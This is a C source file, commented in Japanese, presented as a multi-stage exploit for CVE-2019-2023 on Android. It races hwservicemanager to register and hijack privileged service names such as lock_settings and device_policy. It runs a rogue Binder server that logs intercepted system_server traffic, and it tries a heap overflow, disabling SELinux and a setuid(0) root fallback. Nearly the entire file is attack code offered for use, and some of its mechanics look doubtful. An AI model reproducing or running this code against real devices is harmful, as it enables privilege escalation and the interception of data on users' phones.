#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h>
#include "binder.h"

// ============================================================
// 設定
// ============================================================
#define TARGET_SERVICE "persistent_data_block"   // system_server が所有する特権サービス
#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
#define LOG_FILE       "/data/local/tmp/binder_traffic.log"

// 乗っ取り対象リスト（system_server が利用するサービス）
static const char *hijack_targets[] = {
    "persistent_data_block",
    "device_policy",
    "lock_settings",
    "mount",
    "power",
    NULL
};

static volatile int race_ready = 0;
static int g_service_handle = -1;
static int g_binder_fd = -1;
static int g_exploit_success = 0;

// ============================================================
// ユーティリティ
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        fprintf(fp, "%02x ", data[i]);
        if ((i+1) % 16 == 0) fprintf(fp, "\n");
    }
    fprintf(fp, "\n");
}

static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) return;
    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
    fprintf(fp, "  handle=%d code=0x%x flags=0x%x data_size=%zu offsets_size=%zu\n",
            t->target.handle, t->code, t->flags, (size_t)t->data_size, (size_t)t->offsets_size);
    if (data && t->data_size > 0) {
        fprintf(fp, "  data:\n");
        dump_hex(fp, data, t->data_size);
    }
    fclose(fp);
}

static int read_file(const char *path, char *buf, size_t size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, size - 1);
    close(fd);
    if (n > 0) { buf[n] = '\0'; return 0; }
    return -1;
}

static int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, data, strlen(data));
    close(fd);
    return (n == (ssize_t)strlen(data)) ? 0 : -1;
}

// ============================================================
// CVE-2019-2023 エクスプロイト（レースあり）
// ============================================================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);

    child = fork();
    if (child == 0) {
        while (!race_ready) usleep(100);
        // 何もせず終了（コンテキスト変更は不要な場合もある）
        exit(0);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    // 少し待ってから親が ADD_SERVICE を送信
    usleep(200000);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    race_ready = 1;
    usleep(50000);  // レースウィンドウ

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [-] ADD_SERVICE denied (patch present)\n");
        } else {
            perror("  ioctl ADD_SERVICE");
        }
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded!\n");

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE でハンドル取得
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);
    g_service_handle = handle;
    return 0;
}

// ============================================================
// Binder サーバーループ（乗っ取ったサービスをエミュレート）
// ============================================================
static int binder_server_loop(int binder_fd, int expected_handle) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;

    printf("[*] Starting Binder server loop for handle %d...\n", expected_handle);
    printf("[*] Waiting for transactions...\n");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            perror("  ioctl read");
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        // 受信したコマンドを解析
        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        fprintf(stderr, "[SERVER] Received cmd=0x%x, size=%zu\n", cmd_code, payload_size);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            size_t data_size = t->data_size;
            uint8_t *data_ptr = NULL;
            if (data_size > 0) {
                data_ptr = malloc(data_size);
                if (data_ptr) {
                    memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
                }
            }
            log_transaction("Incoming transaction", t, data_ptr);
            if (data_ptr) free(data_ptr);

            // 応答を返す（ここでは単純に BR_OK を返す）
            struct {
                uint32_t cmd;
                uint32_t status;
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;

            ret = ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
            if (ret < 0) perror("  ioctl write reply");

            // 完了通知も送る
            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
        } else if (cmd_code == BR_DEAD_BINDER) {
            printf("[SERVER] Received DEAD_BINDER\n");
            // 終了する
            break;
        } else {
            // その他のコマンドは無視
            fprintf(stderr, "[SERVER] Ignoring cmd=0x%x\n", cmd_code);
        }
    }
    return 0;
}

// ============================================================
// バッファオーバーフロー試行（巨大サービス名）
// ============================================================
static int overflow_hwservicemanager(void) {
    printf("[*] Attempting heap overflow via large service name...\n");
    char huge_name[8192];
    memset(huge_name, 'A', sizeof(huge_name) - 1);
    huge_name[sizeof(huge_name)-1] = '\0';
    // 巨大な名前で登録（失敗するかもしれないが、クラッシュを狙う）
    int ret = exploit_cve_2019_2023(huge_name);
    if (ret == 0) {
        printf("  [+] Overflow succeeded (unexpected)!\n");
    } else {
        printf("  [-] Overflow attempt failed or caused no crash.\n");
    }
    return ret;
}

// ============================================================
// SELinux 無効化試行
// ============================================================
static int disable_selinux(void) {
    printf("[*] Attempting to disable SELinux...\n");
    if (write_file("/sys/fs/selinux/enforce", "0") == 0) {
        printf("  [+] SELinux disabled!\n");
        return 0;
    }
    const char *ctx = "u:r:system_server:s0";
    if (write_file("/proc/self/attr/current", ctx) == 0) {
        printf("  [+] SELinux context changed to %s\n", ctx);
        return 0;
    }
    return -1;
}

// ============================================================
// プロパティ操作（ctl.start など）
// ============================================================
static int set_property(const char *prop, const char *value) {
    printf("[*] Attempting to set property %s=%s\n", prop, value);
    int fd = open("/dev/socket/property_service", O_RDWR);
    if (fd < 0) {
        perror("  open property_service");
        return -1;
    }
    char buf[512];
    int len = snprintf(buf, sizeof(buf), "%s=%s", prop, value);
    ssize_t n = write(fd, buf, len);
    close(fd);
    if (n == len) {
        printf("  [+] Property set attempted\n");
        return 0;
    }
    return -1;
}

// ============================================================
// メイン：全手法を順次実行
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Multi-Stage Exploit (Binder Server)\n");
    printf("  Target: hwservicemanager + persistent_data_block\n");
    printf("============================================================\n\n");

    // フェーズ1: ターゲットサービスを乗っ取る
    int hijacked = 0;
    for (int i = 0; hijack_targets[i] != NULL; i++) {
        if (exploit_cve_2019_2023(hijack_targets[i]) == 0) {
            printf("[+] Successfully hijacked '%s' (handle %d)\n", hijack_targets[i], g_service_handle);
            hijacked = 1;
            break;
        }
        usleep(300000);
    }
    if (!hijacked) {
        printf("[-] Failed to hijack any target service.\n");
        goto fallback;
    }

    // フェーズ2: Binder サーバーとして動作（バックグラウンドで）
    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/hwbinder for server");
        goto fallback;
    }
    g_binder_fd = binder_fd;

    // 自分自身を Binder サーバーとして登録（BC_ENTER_LOOPER など）
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        perror("  BC_ENTER_LOOPER");
    } else {
        printf("[+] Entered Binder looper.\n");
    }

    // サーバーループを開始（別スレッドまたはフォーク）
    pid_t server_pid = fork();
    if (server_pid == 0) {
        // 子プロセスでサーバーループ実行
        binder_server_loop(binder_fd, g_service_handle);
        exit(0);
    } else if (server_pid < 0) {
        perror("  fork server");
    } else {
        printf("[+] Binder server running in background (PID %d)\n", server_pid);
    }

    // フェーズ3: system_server からの呼び出しを待つ間に、他の攻撃を試行
    printf("[*] Waiting for system_server to call hijacked service...\n");
    printf("[*] Meanwhile, trying additional exploits...\n");

    // オーバーフロー試行
    overflow_hwservicemanager();

    // SELinux 無効化試行
    disable_selinux();

    // プロパティ操作
    set_property("ctl.start", "vendor.cve.poc");  // サービス起動を試みる（効果なし）

    // フェーズ4: 一定時間サーバーを維持（60秒）
    printf("[*] Running server for 60 seconds. Check %s for intercepted data.\n", LOG_FILE);
    sleep(60);

    // サーバーを終了
    kill(server_pid, SIGTERM);
    close(binder_fd);

    // フェーズ5: 結果を出力
    printf("\n[*] Log file content:\n");
    system("cat " LOG_FILE);

    // 最終的に id を実行（権限が上がっていれば）
    if (getuid() == 0 || geteuid() == 0) {
        system("id > " OUTPUT_FILE " 2>&1");
        system("cat " OUTPUT_FILE);
        g_exploit_success = 1;
    } else {
        printf("[-] Still not root. But binder traffic may contain valuable data.\n");
    }

    goto done;

fallback:
    // フォールバック：setuid 系
    printf("[*] Fallback: trying setuid(0)...\n");
    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
        printf("[+] setuid(0) succeeded!\n");
        system("id > " OUTPUT_FILE " 2>&1");
        system("cat " OUTPUT_FILE);
        g_exploit_success = 1;
    }

done:
    printf("\n============================================================\n");
    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
    printf("  Check %s for logs.\n", LOG_FILE);
    return g_exploit_success ? 0 : 1;
}
